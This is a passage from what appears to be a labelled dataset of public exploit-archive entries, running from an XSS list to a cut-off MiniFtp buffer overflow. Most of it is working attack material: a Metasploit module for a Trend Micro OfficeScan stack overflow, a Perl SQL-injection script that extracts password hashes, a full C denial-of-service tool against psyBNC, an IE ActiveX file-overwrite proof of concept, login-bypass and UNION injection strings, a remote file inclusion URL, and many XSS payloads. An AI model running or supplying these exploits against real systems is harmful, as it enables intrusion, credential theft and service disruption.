familynews.php?addnews=yes  	description : when you add news you can put js in "" text area "" field to execute   	page : prayers.php  	description : when you add prayer  ,you can inject js in ""pray for"" field as ""<script>alert(/xss/)</script>""   	page : recipes.php?add=category  	description : insert in ""name"" field  ""><script>alert(/xss/)</script> , it will execute at ""recipes.php?addrecipe=yes"" page  	 	page : calendar.php?add=2011-12-2  	description : when add an event, insert in ""Event"" field (""<script>alert(/xss/)</script>"") 	 	it will execute at  ""calendar.php"" page  	################################Reflected XSS#################################################################################  	These pages have reflected xss . 	 	calendar.php?add=2011-12-7%22%3E%3Cscript%3Ealert%28/family/%29%3C/script%3E  	gallery/index.php?uid=%22%3E%3Cscript%3Ealert%28/xss/%29%3C/script%3E  	##############################################################################################################################",Family,1
16768,"Trend Micro OfficeScan - Remote Stack Buffer Overflow (Metasploit) ## # $Id: trendmicro_officescan.rb 9262 2010-05-09 17:45:00Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core' require 'metasm'  class Metasploit3 < Msf::Exploit::Remote 	Rank = GoodRanking  	include Msf::Exploit::Remote::HttpClient  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Trend Micro OfficeScan Remote Stack Buffer Overflow', 			'Description'    => %q{ 					This module exploits a stack buffer overflow in Trend Micro OfficeScan 				cgiChkMasterPwd.exe (running with SYSTEM privileges). 			}, 			'Author'         => [ 'toto' ], 			'License'        => MSF_LICENSE, 			'Version'        => '$Revision: 9262 $', 			'References'     => 				[ 					[ 'CVE', '2008-1365' ], 					[ 'OSVDB', '42499' ], 				], 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'process', 				}, 			'Payload'        => 				{ 					'MinNops'  => 0, 					'MaxNops'  => 0, 					'Space'    => 498, 					'BadChars' => Rex::Text.charset_exclude(Rex::Text::AlphaNumeric), 					# clean up to prevent crash on exit 					'Prepend' => Metasm::Shellcode.assemble(Metasm::Ia32.new, ""mov dword ptr fs:[0], 0"").encode_string, 					'EncoderOptions' => 						{ 							'BufferRegister' => 'ECX', 						}, 					'StackAdjustment' => -3500, 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					# return addresses need to be alphanumeric (here in loadhttp data section) 					[ 'Windows 2000 - Trend Micro OfficeScan 7.3.0.1293)', { 'Rets' => [0x63613035, 0x63613032] } ], 				], 			'DisclosureDate' => 'Jun 28 2007', 			'DefaultTarget' => 0))  		register_options( 			[ 				Opt::RPORT(8080), 			], self.class) 	end  	def exploit 		geip_src = "" 			push esi 			push esp 			pop eax 			xor esi, [eax] 			push esi 			pop eax 			xor eax, got_eip 			push eax 			pop ecx 			got_eip: 		""  		sc = Metasm::Shellcode.assemble(Metasm::Ia32.new, geip_src)  		sc.base_addr = target['Rets'][0] 		get_eip = sc.encode_string  		pat = Rex::Text.rand_text_alphanumeric(1016)  		pat[0, get_eip.length] = get_eip 		pat[14, payload.encoded.length] = payload.encoded 		pat[512, 4] = [target['Rets'][1]].pack('V')    # string pointer (to prevent a crash) 		pat[524, 4] = [target['Rets'][0]].pack('V')    # sets EIP to the address where the shellcode has been copied 		pat[540, 4] = [target['Rets'][0]-1].pack('V')  # shellcode will be copied at this address (+1)  		data = ""TMlogonEncrypted=!CRYPT!"" + pat 		len = sprintf(""%u"", data.length);  		print_status(""Trying target address 0x%.8x..."" % target['Rets'][0])  		res = send_request_cgi({ 			'uri'          => '/officescan/console/cgi/cgiChkMasterPwd.exe', 			'method'       => 'POST', 			'content-type' => 'application/x-www-form-urlencoded', 			'data'         => data, 		}, 5)  		handler 	end  end",Trend,1
31931,"Crysis 1.21 - HTTP/XML-RPC Service Remote Denial of Service source: https://www.securityfocus.com/bid/29759/info  Crysis is prone to a remote denial-of-service vulnerability because the application fails to handle exceptional conditions.  An attacker can exploit this issue to crash the affected application, denying further service to legitimate users.  Crysis 1.21 is vulnerable; other versions may also be affected.  GET / HTTP/1.0 Content-Length: 0 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",Crysis,0
3892,"Microsoft Internet Explorer 7 - Arbitrary File Rewrite (MS07-027) <html> <title> MS07-027 mdsauth.dll NMSA Session Description Object SaveAs control, arbitrary file modification </title> <body>  <OBJECT id=""target"" classid=""clsid:d4fe6227-1288-11d0-9097-00aa004254a0"">   </OBJECT> <script language=""vbscript""> //next script is converted to UTF16  target.SessionDescription=""MS07-027 mdsauth.dll Proof of Concept exploit""  target.SessionAuthor=""Andres Tarasco Acuna""  target.SessionEmailContact=""atarasco_at_gmail.com""  target.SessionURL=""http://www.514.es""  target.SaveAs ""c:\boot.ini"" </script>  </body> </html>  # milw0rm.com [2007-05-10]",.514.es,0
1793,"DeluxeBB 1.06 - 'name' SQL Injection (mq=off) #!/usr/bin/perl  use IO::Socket;   print q{ ############################################# # DeluxeBB 1.06 Remote SQL Injection Exploit# # 	exploit discovered and coded        # #	   by KingOfSka                     # #	http://contropotere.netsons.org	    # ############################################# };  if (!$ARGV[2]) {  print q{  	Usage: perl dbbxpl.pl host /directory/ victim_userid            perl dbbxpl.pl www.somesite.com /forum/ 1   };  }   $server = $ARGV[0]; $dir    = $ARGV[1]; $user   = $ARGV[2]; $myuser = $ARGV[3]; $mypass = $ARGV[4]; $myid   = $ARGV[5];  print ""------------------------------------------------------------------------------------------------\r\n""; print ""[>] SERVER: $server\r\n""; print ""[>]    DIR: $dir\r\n""; print ""[>] USERID: $user\r\n""; print ""------------------------------------------------------------------------------------------------\r\n\r\n"";  $server =~ s/(http:\/\/)//eg;  $path  = $dir; $path .= ""misc.php?sub=profile&name=0')+UNION+SELECT+0,pass,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0+FROM%20deluxebb_users%20WHERE%20(uid='"".$user ;    print ""[~] PREPARE TO CONNECT...\r\n"";  $socket = IO::Socket::INET->new( Proto => ""tcp"", PeerAddr => ""$server"", PeerPort => ""80"") || die ""[-] CONNECTION FAILED"";  print ""[+] CONNECTED\r\n""; print ""[~] SENDING QUERY...\r\n""; print $socket ""GET $path HTTP/1.1\r\n""; print $socket ""Host: $server\r\n""; print $socket ""Accept: */*\r\n""; print $socket ""Connection: close\r\n\r\n""; print ""[+] DONE!\r\n\r\n"";    print ""--[ REPORT ]------------------------------------------------------------------------------------\r\n""; while ($answer = <$socket>) {   if ($answer =~/(\w{32})/) {    if ($1 ne 0) {    print ""Password Hash is: "".$1.""\r\n""; print ""--------------------------------------------------------------------------------------\r\n"";        } exit(); }  } print ""------------------------------------------------------------------------------------------------\r\n"";  # milw0rm.com [2006-05-15]",DeluxeBB,1
8293,"Free PHP Petition Signing Script - Authentication Bypass                   ||          ||   | ||                    o_,_7 _||  . _o_7 _|| q_|_||  o_w_,           ( :   /    (_)    /           (   .     ###################################################### #	Free PHP Petition Signing Script Release     # # 		Login SQL injection	 	     # ###################################################### #	     Qabandi   | iqa[a]hotmail.fr	     #                 From Kuwait, Peace.   Salamz: Killer Hack, Ghost-R00t, Mr.Mn7os, Cyb3rT ###################################################### Download: http://www.rediscussed.com/2008/01/18/free-php-petition-signing-script-release/ ------------------------------------------------------ -:PoC:-   http://usa-homeland.org/pet/signing_system-admin  Username: admin ' or ' 1=1 Password: nothing   ------------vuln--code---------(./signing_system-admin/index.php)  $query = mysql_query(""SELECT username,password FROM `accounts` WHERE username='$username' AND password='$password'"", $conn) or die(mysql_error());  ------------------------------------  # milw0rm.com [2009-03-27]",.redisc,1
35826,"Joomla! Component CCBoard - SQL Injection / Arbitrary File Upload source: https://www.securityfocus.com/bid/48108/info  http://www.noticeboardpro.com/notice-board-pro-copyright.htmlJoomla CCBoard is prone to an SQL-injection vulnerability and an arbitrary-file-upload vulnerability because it fails to sanitize user-supplied data.  Exploiting these issues could allow an attacker to compromise the application, execute arbitrary code, access or modify data, or exploit latent vulnerabilities in the underlying database.  http://www.example.com/index.php?option=com_ccboard&view=postlist&forum=1&topic=2",.noticeboardpro.,0
17829,"dotProject 2.1.5 - SQL Injection # Exploit Title: dotProject 2.1.5 SQL Injection Vulnerability # Google Dork: intitle:""dotproject"" # Date: 2011-12-09 # Author: sherl0ck_ <sherl0ck_[at]alligatorteam[dot]org> @AlligatorTeam # Software Link: http://www.dotproject.net/ # Version: 2.1.5 (tested) # Tested on: Debian GNU/Linux 5.0  --------------- PoC ---------------  URL: http://www.site.com/dotproject/index.php?m=ticketsmith&a=view&ticket=-2union all select 1,2,3,@@VERSION,5,USER(),7,8,9,10,11,12,13,DATABASE(),group_concat(user_username,0x3A,user_password,0xA),16 from dotp_users  --------------- Vulnerable code ---------------  modules/ticketsmith/view.php ... 11 $ticket = dPgetParam($_GET, 'ticket', ''); ... 219 $ticket_info = query2hash(""SELECT * FROM {$dbprefix}tickets WHERE ticket = $ticket""); ...  Functions:  includes/main_functions.php ... 283 function dPgetParam(&$arr, $name, $def=null) { 284   return defVal($arr[$name], $def); 285 } ...  modules/ticketsmith/common.inc.php ...  50 /* get result in associative array */  51 function query2hash ($query) {  52  53   $result = do_query($query);  54   $row = @mysql_fetch_array($result);  55   return($row);  56  57 } ...  22 function do_query ($query) {  23   $result = @mysql_query($query);  24   if (!$result) {  25     fatal_error(""A database query error has occurred!<br>"".mysql_error());  26   } else {  27     return($result);  28   }  29  30 }",dotproject,1
28152,free QBoard 1.1 - 'contact.php?qb_path' Remote File Inclusion source: https://www.securityfocus.com/bid/18780/info      Plume CMS is prone to multiple remote file-include vulnerabilities because it fails to properly sanitize user-supplied input.      A successful exploit of these issues allows the attacker to execute arbitrary server-side script code on an affected computer with the privileges of the webserver process. This may facilitate unauthorized access.      www.example.com/(path)/contact.php?qb_path=http://evilcode.txt?,free,0
15217,"Feindura File Manager 1.0(rc) - Arbitrary File Upload =================================================== Feindura File Manager 1.0(rc) - Remote File Upload ===================================================  ~~~~~~~~~~~~~~~[My]~~~~~~~~~~~~~~~~~~~~~~~~~~~~ [+] Author : KnocKout [~] Contact : knockoutr@msn.com ~~~~~~~~~~~~~~~~[Software info]~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ~Web App. : Feindura - Flat File Content Management System 1.0 rc ~Software: http://feindura.org/ -Demo : http://demo.feindura.org/ ~Vulnerability Style : File Upload ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~       ~~~~~~~~ Explotation ~~~~~~~~~~~       Shell Upload . you use ""GIF81a;""     ================================     http://TARGET/path/library/thirdparty/filemanager/     ================================           [+]  Remote File uploaded.                             GoodLucK ;)   # Inj3ct0r.com [2010-09-28]",Feindura,1
383,"psyBNC 2.3 - Denial of Service /*  * psyBNC <= 2.3 DoS * Information System Advancement in Penetration (ISAP) Labs * By Lunar Fault [ElectronicSouls] * (C) May 19, 2002 * * Legal Notice: * In no way is ElectronicSouls, ISAP, or the author responsible for the * actions or usage of this program. The author retains all copyrights to the * contents within includeing this banner, except for the resolvenametoip()  * function. This source is not to be used for illegal purposes. Please check  * your local laws before testing this proof of concept.  * * Description:  * Problem dealing with over sized passwords. Once the DoS has been sent the  * victim's psybnc's pid slowly begins to eat up cpu usage. This also results  * in the fact that psybnc holds the connection with a TIME_WAIT further denying  * access to the bnc. If you try and exploit the server more times than it allows  * connections in force mode. The result will be a Broken Pipe, in standard mode it  * will tell you the server is not vuln. *  * es 11805 99.7 1.9 2672 1216 pts/1 R 06:28 19:17 ./psybnc  * * Tested on psyBNC2.3, psyBNC2.2.1, psyBNC2.1.1 * Succefully exploited on Linux x86, and OpenBSD 3.0 x86.  *  * Lunar Fault */  #include <stdio.h> #include <stdlib.h> #include <sys/types.h> #include <sys/socket.h> #include <netinet/in.h> #include <arpa/inet.h> #include <netdb.h> #include <getopt.h> #include <unistd.h> #include <string.h>   #define SIZE 9000 #define PORT 31337  #define USER ""pr0ix""  int senddos(int port, int size, char *target, char *user); int checkvuln(char *rxbuf);  int testvuln(int port, char *target); unsigned long resolvenametoip(char *name);  void usage(char *prog);  int checked = 0; int force;  int main(int argc, char *argv[]) {   int c, i, z;   int port, size, times;   int u_t = 0, d_t = 0, n_t = 0, p_t = 0, s_t = 0, t_t;   char target[1024], *user;      printf(""[+] ES psyBNC <= 2.3 DoS\n"");   printf(""[+] Information System Advancement in Penetration (ISAP) Labs\n"");   printf(""[+] By: Lunar Fault [ElectronicSouls]\n"");      if(argc < 2) { usage(argv[0]);}       while ((c = getopt (argc, argv, ""d:n:p:s:u:hft""))!=EOF) {     switch(c) {     case 'h':       usage(argv[0]);       break;     case 'f':       force = 1;       break;     case 'd':       strncpy(target, optarg, sizeof(target));       d_t = 1;       break;     case 'n':       times = atoi(optarg);       n_t = 1;       break;     case 'p':       port = atoi(optarg);       p_t = 1;       break;     case 's':       size = atoi(optarg);       s_t = 1;       break;     case 't':       t_t = 1;       break;     case 'u':       user = (char *) malloc(strlen(optarg));       memcpy(user, optarg, strlen(optarg));       u_t = 1;       break;     }   }      if (d_t == 0) { usage(argv[0]); }      if (n_t == 0) times = 3;      if (p_t == 0) port = PORT;      if (s_t == 0) size = SIZE;      if (u_t == 0) {      user = (char *) malloc(strlen(USER));     memcpy(user, USER, strlen(USER));   }      printf(""[*] Victim: %s\n"", target);   printf(""[*] Port: %d\n"", port);   printf(""[*] User: %s\n"", user);   printf(""[*] Size: %d\n"", size);   printf(""[*] Times: %d\n"", times);      if (t_t == 1) {     printf(""[*] Testing for vulnerability\n"");     z = testvuln(port, target);     printf(""\n"");     if (z == -1) {       printf(""[!] Failed to test Vuln!\n"");       exit(1);     }     return 0;   }       if (force == 1)      printf(""[*] Forceing DoS\n"");       for (i = 0; i < times; i++) {     z = senddos(port, size, target, user);     if (z == -1) {       printf(""[!] Failed on sending DoS!\n"");       exit(1);     }   }      printf(""[*] DoS sent %d times\n\n"", times);   return 0; }  int senddos(int port, int size, char *target, char *user) {   int i, s, z, len_inet;   unsigned long ipaddr;   char *dosbuf, tmpbuf[128], *passbuf, rxbuf[1024];      struct sockaddr_in victim;      if (!(ipaddr = resolvenametoip(target))) {     printf(""[!] Failed to resolve '%s'\n"", target);     exit(1);   }      victim.sin_family = AF_INET;   victim.sin_port = htons(port);   victim.sin_addr.s_addr = ipaddr;      len_inet = sizeof(victim);      s = socket(PF_INET, SOCK_STREAM, 0);   if (s < 0) {     printf(""[!] Failed to open socket!\n"");     exit(1);   }      z = connect(s, (struct sockaddr *)&victim, len_inet);   if (z < 0) {     printf(""[!] Connection refused!\n"");     exit(1);   }      z = read(s, rxbuf, sizeof(rxbuf));   if (z == -1) {     printf(""[!] Failed on read!\n"");     exit(1);   }      z = checkvuln(rxbuf);   if (z == -1) {     printf(""[!] Failed on vuln check!\n"");     exit(1);   }      snprintf(tmpbuf, sizeof(tmpbuf), ""NICK %s\n\r"", user);      z = write(s, tmpbuf, strlen(tmpbuf));   if (z == -1) {     printf(""[!] Failed on write!\n"");     exit(1);   }      z = read(s, rxbuf, sizeof(rxbuf));   if (z == -1) {     printf(""[!] Failed on read!\n"");     exit(1);   }      passbuf = (char *) malloc(size);   for (i = 0; i < size; i++)      *(char *) &passbuf[i] = ""A"";      dosbuf = (char *) malloc(7 + strlen(passbuf));      memcpy(dosbuf, ""PASS "", 5);      memcpy(dosbuf+5, passbuf, strlen(passbuf));      memcpy(dosbuf+5+strlen(passbuf), ""\n\r"", 2);      z = write(s, dosbuf, strlen(dosbuf));   if (z == -1) {     printf(""[!] Failed on write!\n"");     exit(1);   }      close(s);      free(dosbuf);   free(passbuf);      return 0; }  int checkvuln(char *rxbuf) {   int vuln_t;   char *bnc;      sprintf(&rxbuf[strlen(rxbuf)-2], 0);      if (force == 1) {return 0;}   if (checked == 1) { return 0;}   printf(""[?] Server returned: %s\n"", rxbuf);   if (bnc = strstr(rxbuf, ""psyBNC2."")) {     if (strcasecmp(&bnc[9], ""."") > 0) {       vuln_t = 1;     }     if ((int)(bnc[8] - '0') <= 3) {        if ((int)(bnc[8] - '0') == 3 && vuln_t == 1) {         printf(""[!] Server is NOT VULN!\n"");         exit(1);       }       printf(""[*] Server is VULN!!\n"");     } else {       printf(""[!] Server is NOT VULN!\n"");       exit(1);     }   } else {      printf(""[!] Server is NOT VULN!\n"");     exit(1);   }      checked = 1;      return 0; }  int testvuln(int port, char *target) {   int s, z, len_inet;   unsigned long ipaddr;   char rxbuf[1024];      struct sockaddr_in victim;      if (!(ipaddr = resolvenametoip(target))) {     printf(""[!] Failed to resolve '%s'\n"", target);     exit(1);   }      victim.sin_family = AF_INET;   victim.sin_port = htons(port);   victim.sin_addr.s_addr = ipaddr;      len_inet = sizeof(victim);      s = socket(PF_INET, SOCK_STREAM, 0);   if (s < 0) {     printf(""[!] Failed to open socket!\n"");     exit(1);   }      z = connect(s, (struct sockaddr *)&victim, len_inet);   if (z < 0) {     printf(""[!] Connection refused!\n"");     exit(1);   }      z = read(s, rxbuf, sizeof(rxbuf));   if (z == -1) {     printf(""[!] Failed on read!\n"");     exit(1);    }      z = checkvuln(rxbuf);   if (z == -1) {     printf(""[!] Failed on vuln check!\n"");     exit(1);   }      return 0; }  unsigned long resolvenametoip(char *name) {   struct hostent *host;   unsigned long addr;      if ((addr = inet_addr(name)) == -1) {     if (!(host = gethostbyname(name))) return 0;     else addr = *((unsigned long*)host->h_addr);   }      return addr; }   void usage(char *prog)  {   printf(""usage: %s [options]\n"", prog);   printf(""\t-d <target> Server hosting psybnc [REQUIRED]\n"");   printf(""\t-f force Skip vuln checking\n"");   printf(""\t-h help Your looking at it\n"");   printf(""\t-n <number> Number of times to attack Default: 3\n"");   printf(""\t-p <port> Port to connect to Default: 31337\n"");   printf(""\t-s <size> Size of password to send Default: 9000\n"");   printf(""\t-t test Tests for vuln\n"");   printf(""\t-u <user> User to login with Default: pr0ix\n\n"");   exit(1); }",psyBNC,0
9903,"OpenDocMan 1.2.5 - Cross-Site Scripting / SQL Injection Security Advisory : Multiple vulnerabilities in OpenDocMan Discovered by 	==> Amol Naik (amolnaik4[at]gmail.com)  ## Overview ## -------------- OpenDocMan is a free document management system (DMS) designed to comply with ISO 17025 and OIE standard for document management. It features web based access, fine grained control of access to files, and automated install and upgrades.   ## Vulnerability Description ## ----------------- OpenDocMan is vulnerable to authentication bypass and multiple cross-site scripting issues.    ## Technical Details ## ------------- Vulnerable Product 	: OpenDocMan v1.2.5 Download		: http://sourceforge.net/projects/opendocman/files/opendocman/1.2.5/opendocman-1.2.5.zip/download   Authentication Bypass: ----------------------  A valid username require to carry put Auth Bypass. Default is ""admin"".   Cross-site Scripting: ---------------------  Multiple instances of Cross-site scripting found majorly due to use of $_SERVER['PHP_SELF'] in action parameter of form field and due to absence of validation for ""last_message"" parameter.    ## Proof of concept ## ----------------------  Authentication Bypass: ----------------------  Username : admin' OR '1'='1 Password : nothing  Cross-site scripting: ---------------------  http://localhost/opendocman/category.php/""><script>alert(1)</script><""?aku=c3VibWl0PWFkZCZzdGF0ZT0y http://localhost/opendocman/department.php/""><script>alert(1)</script><""?aku=c3VibWl0PXNob3dwaWNrJnN0YXRlPTI= http://localhost/opendocman/profile.php/""><script>alert(1)</script> http://localhost/opendocman/rejects.php/""><script>alert(1)</script> http://localhost/opendocman/search.php/""><script>alert(1)</script> http://localhost/opendocman/toBePublished.php/""><script>alert(1)</script> http://localhost/opendocman/user.php/""><script>alert(1)</script><""?aku=c3VibWl0PXNob3dwaWNrJnN0YXRlPTI= http://localhost/opendocman/view_file.php/""><script>alert(1)</script><""?aku=aWQ9NiZzdGF0ZT0z http://localhost/opendocman/index.php?last_message=<script>alert(1)</script> http://localhost/opendocman/user.php?submit=Modify+User&item=2&caller=/opendocman/""><script>alert(123)</script><"" http://localhost/opendocman/add.php?last_message=<script>alert(1)</script> http://localhost/opendocman/toBePublished.php?last_message=<script>alert(1)</script> http://localhost/opendocman/admin.php?last_message=<script>alert(1)</script>  ## Workaround ## ---------------- Update to newer version v1.2.5.2 opendocmanv1.2.5.2: http://sourceforge.net/projects/opendocman/files/opendocman/1.2.5.2/opendocman-1.2.5.2.zip/download   ## TimeLine ## ---------------------- 10th Oct 2009 : Bug Discovered 12th Oct 2009 : vendor was notified by e-mail 12th Oct 2009 : Vendor response received 20th Oct 2009 : A new release publicly available 20th Oct 2009 : Public Disclosure",opendocman,1
46807,"MiniFtp - 'parseconf_load_setting' Buffer Overflow # Exploit Title: MiniFtp parseconf_load_setting local-bufferoverflow (318 bytes) # Google Dork: None # Date: 11.04.2019 # Exploit Author: strider # Vendor Homepage: https://github.com/skyqinsc/MiniFtp # Software Link: https://github.com/skyqinsc/MiniFtp # Tested on: Debian 9 Stretch i386/ Kali Linux i386 # CVE : None # Shellcode Length: 318 ------------------------------[Description]---------------------------------  This exploit spawns a shell with root privileges. The exploit will be written into the file miniftpd.conf  vuln code: void parseconf_load_setting(const char *setting){ while(isspace(*setting)) setting++; 	char key[128] = {0}, value[128] = {0}; 	str_split(setting, key, value, '='); 	if(strlen(value) == 0){ 		fprintf(stderr, ""missing value in config file for : %s\n"", key); 		exit(EXIT_FAILURE); 	} ....  The given var settings is a *char and will be splitted into key and value key and value are both 128 char long and settings can be longer than 128 + 128 chars. this issue will not be checked and stored. This causes a buffer overflow.  after return it   -----------------------------[Gdb-Peda Dump]--------------------------------- [----------------------------------registers-----------------------------------] RAX: 0x0  RBX: 0x48575250e7894851  RCX: 0xffffffd480050f3b  RDX: 0x90  RSI: 0x7fffffffd3a0 --> 0x9090909090909090  RDI: 0x55555555c854 (""download_max_rate"") RBP: 0x50f3bc08348e689  RSP: 0x7fffffffd460 --> 0x555555556860 (<_start>:	xor    ebp,ebp) RIP: 0x7fffffffd481 --> 0x9090909090909090  R8 : 0xa ('\n') R9 : 0x7fffffffd4a0 --> 